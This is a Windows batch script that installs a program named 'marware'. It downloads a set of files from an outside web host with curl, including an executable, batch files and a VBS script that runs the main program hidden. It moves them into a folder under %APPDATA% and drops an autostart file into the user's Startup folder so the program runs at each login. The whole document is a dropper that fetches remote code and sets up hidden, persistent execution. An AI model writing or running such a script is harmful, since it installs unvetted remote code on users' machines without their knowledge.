mkdir "%APPDATA%\marware"

curl -O http://harimtim.de/marware/1.1/image1.txt
curl -O http://harimtim.de/marware/1.1/image2.txt
curl -O http://harimtim.de/marware/1.1/icon.ico
curl -O http://harimtim.de/marware/1.1/main.bat
curl -O http://harimtim.de/marware/1.1/matrix.bat
curl -O http://harimtim.de/marware/1.1/show1.bat
curl -O http://harimtim.de/marware/1.1/show2.bat
curl -O http://harimtim.de/marware/1.1/run_main_hidden.vbs
curl -O http://harimtim.de/marware/1.1/main.exe
curl -O http://harimtim.de/marware/1.1/autostart.bat
curl -O http://harimtim.de/marware/1.1/starter.bat
curl -O http://harimtim.de/marware/1.1/input_left.txt

move starter.bat "%APPDATA%\marware"
move input_left.txt "%APPDATA%\marware"
move icon.ico "%APPDATA%\marware"
move show1.bat "%APPDATA%\marware"
move show2.bat "%APPDATA%\marware"
move main.bat "%APPDATA%\marware"
move matrix.bat "%APPDATA%\marware"
move main.exe "%APPDATA%\marware"
move image1.txt "%APPDATA%\marware"
move image2.txt "%APPDATA%\marware"
move run_main_hidden.vbs "%APPDATA%\marware"
move autostart.bat "%APPDATA%\Microsoft\Windows\Start Menu\Programs\Startup"

exit
